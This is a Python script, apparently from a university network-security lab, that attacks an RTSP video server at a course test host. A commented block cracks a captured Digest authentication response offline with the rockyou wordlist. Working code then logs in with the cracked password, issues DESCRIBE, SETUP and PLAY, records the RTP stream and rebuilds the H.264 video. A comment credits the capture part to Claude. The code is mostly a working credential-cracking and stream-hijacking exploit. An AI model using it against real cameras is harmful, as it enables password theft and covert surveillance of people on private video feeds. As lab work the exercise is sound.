# #######
# ### BRUTE FORCE OFFLINE
# #######
#
# import hashlib
# import itertools
# import string
#
# expected_response="b3539154c5b784bba2c47a1a6c7c4ab0"
#
# username = "user"
# realm = "PythonRTSP"
# nonce="4874a055c3f4390506d99e6c51a9e3e360cbef8a62abd7079e11faddcb70a38c"
# uri = "rtsp://cns-test.idlab.uantwerpen.be:50002/video"
#
# # to create the response: https://stackoverflow.com/questions/17444635/rtsp-authentication-digest-issue#:~:text=HA1%20%3D%20md5%28%22user%3AStreaming%20Server%3Atest%22%29%20HA2%20%3D%20md5%28%22DESCRIBE%3A%2Flive%2Fmy%5Fstream%2Esdp%22%29%20RESPONSE%20%3D%20md5%28HA1%2B%22%3A%22%2Bnonce%2B%22%3A%22%2BHA2%29
# #     HA1 = md5("user:Streaming Server:test")
# #     HA2 = md5("DESCRIBE:/live/my_stream.sdp")
# #     RESPONSE = md5(HA1+":"+nonce+":"+HA2)
#
# # all_passwords = open("most_common_passwords_100k.txt").readlines()
# all_passwords = open("rockyou.txt", "rb").readlines()
#
# H2 = hashlib.md5(f"DESCRIBE:{uri}".encode()).hexdigest()
# for password in all_passwords:
#     H1 = hashlib.md5(f"{username}:{realm}:{password}".encode()).hexdigest()
#     response = hashlib.md5(f"{H1}:{nonce}:{H2}".encode()).hexdigest()
#     if response == expected_response:
#         print(password)
#         break



import socket
import hashlib
import base64
import struct
import time


host = "cns-test.idlab.uantwerpen.be"
port = 50002

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))


def receive(s, write=True, decode="ascii"):
    BUFFER_SIZE = 1024
    buffer = bytes()
    while msg := s.recv(BUFFER_SIZE):
        text = msg
        buffer += text
        if len(msg) < BUFFER_SIZE:
            break
    if write:
        print(buffer.decode("ascii", errors="replace"), end="")
    if decode is None:
        return buffer
    return buffer.decode(decode)


def send(s, msg):
    s.sendall(msg.encode("ascii"))
    print(msg, end="")


uri = "rtsp://cns-test.idlab.uantwerpen.be:50002/video"

req1 = f"DESCRIBE {uri} RTSP/1.0\r\nCSeq: 1\r\n\r\n"
send(s, req1)
res = receive(s)

realm = res.split('realm="')[1].split('"')[0]
nonce = res.split('nonce="')[1].split('"')[0]

username = "user"
password = "camera123456789"  # cracked offline via digest dictionary attack

# RFC 2617 HTTP/RTSP Digest, no qop:
# HA1 = MD5(username:realm:password)
# HA2 = MD5(method:uri)
# response = MD5(HA1:nonce:HA2)
H1 = hashlib.md5(f"{username}:{realm}:{password}".encode()).hexdigest()
H2 = hashlib.md5(f"DESCRIBE:{uri}".encode()).hexdigest()
response = hashlib.md5(f"{H1}:{nonce}:{H2}".encode()).hexdigest()

req2 = (
    f"DESCRIBE {uri} RTSP/1.0\r\n"
    f"CSeq: 2\r\n"
    f'Authorization: Digest username="{username}", realm="{realm}", '
    f'nonce="{nonce}", uri="{uri}", response="{response}", algorithm="MD5"\r\n'
    f"\r\n"
)
send(s, req2)
res2 = receive(s)

sprop = res2.split("sprop-parameter-sets=")[1].split("\r\n")[0].split(";")[0].rstrip()
sps_b64, pps_b64 = sprop.split(",")
sps_nal = base64.b64decode(sps_b64)
pps_nal = base64.b64decode(pps_b64)

session = [l for l in res2.splitlines() if l.startswith("Session: ")]

track_uri = f"{uri}/trackID=0"
H2_setup = hashlib.md5(f"SETUP:{track_uri}".encode()).hexdigest()
response_setup = hashlib.md5(f"{H1}:{nonce}:{H2_setup}".encode()).hexdigest()

session_header = "".join(f"{line}\r\n" for line in session)

req3 = (
    f"SETUP {track_uri} RTSP/1.0\r\n"
    f"Transport: RTP/AVP/TCP;unicast;interleaved=0-1\r\n"
    f"CSeq: 3\r\n"
    f"{session_header}"
    f'Authorization: Digest username="{username}", realm="{realm}", '
    f'nonce="{nonce}", uri="{track_uri}", response="{response_setup}", algorithm="MD5"\r\n'
    f"\r\n"
)
 
send(s, req3)
res3 = receive(s)
 
session = [l for l in res3.splitlines() if l.startswith("Session: ")] or session
session_header = "".join(f"{line}\r\n" for line in session)
 
H2_play = hashlib.md5(f"PLAY:{track_uri}".encode()).hexdigest()
response_play = hashlib.md5(f"{H1}:{nonce}:{H2_play}".encode()).hexdigest()
 
req4 = (
    f"PLAY {track_uri} RTSP/1.0\r\n"
    f"CSeq: 4\r\n"
    f"{session_header}"
    f'Authorization: Digest username="{username}", realm="{realm}", '
    f'nonce="{nonce}", uri="{track_uri}", response="{response_play}", algorithm="MD5"\r\n'
    f"\r\n"
)
 
send(s, req4)
receive(s)


###### THIS IS DONE BY CLAUDE

# ---- capture raw interleaved stream for a fixed duration ----
CAPTURE_SECONDS = 15
s.settimeout(1.0)
raw = b""
deadline = time.time() + CAPTURE_SECONDS
print(f"\nCapturing for {CAPTURE_SECONDS}s...")
while time.time() < deadline:
    try:
        chunk = s.recv(65536)
        if not chunk:
            break
        raw += chunk
    except socket.timeout:
        continue
 
s.close()
 
with open("raw_interleaved.bin", "wb") as f:
    f.write(raw)
print(f"\nCaptured {len(raw)} bytes -> raw_interleaved.bin")
 
 
# ---- parse RTSP interleaved framing: '$' + channel(1) + length(2, big-endian) + payload ----
def parse_interleaved(data):
    i = 0
    packets = []  # (channel, rtp_payload)
    n = len(data)
    while i < n:
        if data[i:i+1] != b"$":
            # resync: scan forward for the next '$'
            nxt = data.find(b"$", i + 1)
            if nxt == -1:
                break
            i = nxt
            continue
        if i + 4 > n:
            break
        channel = data[i+1]
        length = struct.unpack(">H", data[i+2:i+4])[0]
        if i + 4 + length > n:
            break
        payload = data[i+4:i+4+length]
        packets.append((channel, payload))
        i += 4 + length
    return packets
 
 
packets = parse_interleaved(raw)
video_rtp = [p for ch, p in packets if ch == 0]
print(f"interleaved packets: {len(packets)}, video RTP packets: {len(video_rtp)}")
 
 
# ---- depacketize H.264 from RTP (RFC 6184) ----
def depacketize_h264(rtp_packets):
    nals = []
    fu_buffer = None
    for pkt in rtp_packets:
        if len(pkt) < 12:
            continue
        payload = pkt[12:]  # skip fixed 12-byte RTP header (no CSRC/extensions assumed)
        if not payload:
            continue
        nal_header = payload[0]
        nal_type = nal_header & 0x1F
 
        if 1 <= nal_type <= 23:
            # single NAL unit packet
            nals.append(payload)
        elif nal_type == 24:
            # STAP-A: aggregated NAL units, each as 2-byte length + NAL
            off = 1
            while off + 2 <= len(payload):
                size = struct.unpack(">H", payload[off:off+2])[0]
                off += 2
                if off + size > len(payload):
                    break
                nals.append(payload[off:off+size])
                off += size
        elif nal_type == 28:
            # FU-A fragmentation unit
            if len(payload) < 2:
                continue
            fu_header = payload[1]
            start = bool(fu_header & 0x80)
            end = bool(fu_header & 0x40)
            orig_type = fu_header & 0x1F
            frag = payload[2:]
            if start:
                reconstructed_header = (nal_header & 0xE0) | orig_type
                fu_buffer = bytes([reconstructed_header]) + frag
            elif fu_buffer is not None:
                fu_buffer += frag
            if end and fu_buffer is not None:
                nals.append(fu_buffer)
                fu_buffer = None
        # else: ignore other types (e.g. 25-27, 29 not handled here)
    return nals
 
 
nals = depacketize_h264(video_rtp)
print(f"depacketized NAL units: {len(nals)}")
 
start_code = b"\x00\x00\x00\x01"
with open("stream.h264", "wb") as f:
    f.write(start_code + sps_nal)
    f.write(start_code + pps_nal)
    for nal in nals:
        f.write(start_code + nal)
 
print("wrote stream.h264 -- try: ffplay stream.h264")
print("or convert: ffmpeg -i stream.h264 -frames:v 30 frame_%03d.png")

s.close()

